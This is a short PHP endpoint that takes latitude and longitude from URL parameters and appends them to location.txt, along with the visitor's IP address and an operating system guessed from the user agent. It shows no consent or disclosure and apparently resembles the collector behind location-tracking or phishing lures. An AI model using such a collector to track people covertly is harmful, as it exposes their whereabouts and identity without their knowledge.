<?php
// Validate and sanitize input
if (isset($_GET["lat"]) && isset($_GET["long"])) {
  $lat = filter_var($_GET["lat"], FILTER_SANITIZE_NUMBER_FLOAT, FILTER_FLAG_ALLOW_FRACTION);
  $long = filter_var($_GET["long"], FILTER_SANITIZE_NUMBER_FLOAT, FILTER_FLAG_ALLOW_FRACTION);

  // Append to file instead of overwriting
  $myfile = fopen("location.txt", "a");
  $txt = "lat: " . $lat . "\nlong: " . $long . "\n";
  fwrite($myfile, $txt);
  fclose($myfile);

  // Get user's IP address
  $ip = $_SERVER['REMOTE_ADDR'];

  // Get user's OS
  $user_agent = $_SERVER['HTTP_USER_AGENT'];
  $os = "";
  if (strpos($user_agent, 'Windows') !== false) {
    $os = 'Windows';
  } elseif (strpos($user_agent, 'Macintosh') !== false) {
    $os = 'Macintosh';
  } elseif (strpos($user_agent, 'Android') !== false) {
    $os = 'Android';
  } elseif (strpos($user_agent, 'iOS') !== false) {
    $os = 'iOS';
  } elseif (strpos($user_agent, 'Linux') !== false) {
    $os = 'Linux';
  } else {
    $os = 'Unknown OS';
  }

  // Append IP and OS to file
  $myfile = fopen("location.txt", "a");
  $txt = "IP address: " . $ip . "\nOS: " . $os . "\n";
  fwrite($myfile, $txt);
  fclose($myfile);
}
?>
